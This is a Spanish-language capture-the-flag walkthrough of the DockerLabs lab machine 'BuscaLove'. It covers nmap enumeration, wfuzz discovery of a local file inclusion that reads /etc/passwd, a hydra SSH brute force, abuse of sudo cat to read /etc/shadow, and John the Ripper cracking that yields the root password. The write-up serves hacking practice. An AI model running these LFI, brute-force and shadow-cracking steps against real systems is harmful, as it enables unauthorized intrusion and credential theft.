#MAQUINA #DOCKERLABS #FACIL 
#LFI
<hr>

# RECONOCIMIENTO

Vamos a resolver **BuscaLove** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.18.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash
nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.18.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 13:28 CET
Initiating ARP Ping Scan at 13:28
Scanning 172.18.0.2 [1 port]
Completed ARP Ping Scan at 13:28, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:28
Scanning 172.18.0.2 [65535 ports]
Discovered open port 22/tcp on 172.18.0.2
Discovered open port 80/tcp on 172.18.0.2
Completed SYN Stealth Scan at 13:28, 0.58s elapsed (65535 total ports)
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2024-11-25 13:28:22 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:12:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

 nmap -sCV -p22,80 172.18.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 13:28 CET
Nmap scan report for 172.18.0.2
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 dc:4c:b6:41:c4:e1:72:c3:7d:a0:ed:ca:0e:7a:bc:54 (ECDSA)
|_  256 66:61:de:8c:fb:5b:3b:f4:fb:b9:ca:69:b1:ac:6e:2e (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds



```

   ```bash

nmap --script="http-enum" 172.18.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 13:29 CET
Nmap scan report for 172.18.0.2
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /wordpress/: Blog
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Posible **wordpress**

## HTTP (80)

Al revisar la web que hay en el puerto 80, vamos a utilizar **wpscan** para ver si realmente el directorio wordpress lo utiliza.
El wpscan nos dice que no es wordpress. Utilizando **gobuster** sobre el directorio lo único interesantes es el index.php.
Vamos a utilizar wfuzz para intentar ver si es vulnerable a un posible **LFI**:

   ```bash

wfuzz -u "http://172.18.0.2/wordpress/index.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hl=40 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.18.0.2/wordpress/index.php?FUZZ=/etc/passwd
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                              
=====================================================================

000001915:   200        66 L     148 W      2319 Ch     "love" 


```

# EXPLOTACION

Efectivamente -> **love** es el parámetro que debemos usar

Al apuntar el /etc/passwd -> Dos usuarios : **pedro** y **rosa**

Usamos **hydra** para intentar sacar su contraseña:

   ```bash
hydra -l rosa -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 64        
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-25 13:40:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[STATUS] 489.00 tries/min, 489 tries in 00:01h, 14343952 to do in 488:54h, 22 active
[22][ssh] host: 172.18.0.2   login: rosa   password: lovebug
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 12 final worker threads did not complete until end.
[ERROR] 12 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-25 13:42:00


```
**usuario : rosa**
**contraseña: lovebug**
# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
rosa@5f45452576bc:~$ sudo -l
Matching Defaults entries for rosa on 5f45452576bc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rosa may run the following commands on 5f45452576bc:
    (ALL) NOPASSWD: /usr/bin/ls, /usr/bin/cat

```

Vemos **cat** con permisos SUDO cogemos el shadow y el passwd y lo intentamos crackear con john:
   ```bash
#formateo para que john entiend
unshadow passwd shadow > z 
#john the ripper
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt z 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lovebug          (rosa)     
kittycat         (root) 

```

**usuario : root**
**contraseña: kittycat**

**YA ESTAMOS COMO ROOT.**